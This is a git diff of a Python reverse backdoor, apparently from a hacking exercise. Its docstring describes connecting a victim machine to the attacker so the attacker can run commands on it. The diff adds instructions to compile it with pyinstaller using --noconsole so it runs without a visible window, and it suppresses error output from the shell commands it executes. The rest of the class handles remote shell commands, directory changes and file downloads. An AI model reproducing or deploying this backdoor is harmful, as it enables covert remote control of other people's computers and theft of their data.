@@ -1,15 +1,27 @@
 #!/usr/bin/env python
 
+from asyncio.subprocess import DEVNULL
 import socket
 import subprocess
 import json
 import os
 import base64
+import sys
 
 """
 Program that connect a victim machine to hacker machine and allows 
 hacker to use terminal commands inside a victim machine
 """
+
+"""
+Also the best option will be to convert our program
+into an executable file using command on Windows:
+C:\Python27\Scripts\yinstaller.exe reverse_backdoor.py --onefile --noconsole
+or other version of python, but using pyinstaller.
+--noconsole -> after executing command do not open console.
+"""
+
+
 
 
 class Backdoor:
@@ -21,7 +33,9 @@ class Backdoor:
 	# Method that return output of command that hacker entered
 
 	def execute_system_command(self, command):
-		return subprocess.check_output(command, shell=True)
+		# stderr/stdin = DEVNULL -> using this line to redirecte standart errors and input to nothing
+		# we use it ^ only because we use command check_output
+		return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)
 
 	# Method that convert data into json object
 
@@ -40,7 +54,7 @@ class Backdoor:
 			except ValueError:
 				continue
 
-	# Method that allows hacker to use "cd" command
+	# Method that allows hacker to use "cd" command and change working directory
 
 	def change_working_directory_to(self, path):
 		os.chdir(path)
@@ -68,7 +82,7 @@ class Backdoor:
 			try:
 				if command[0] == "exit":
 					self.connection.close()
-					exit()
+					sys.exit()
 				elif command[0] == "cd" and len(command) > 1:
 					command_result = self.change_working_directory_to(command[1])
 				elif command[0] == "download":
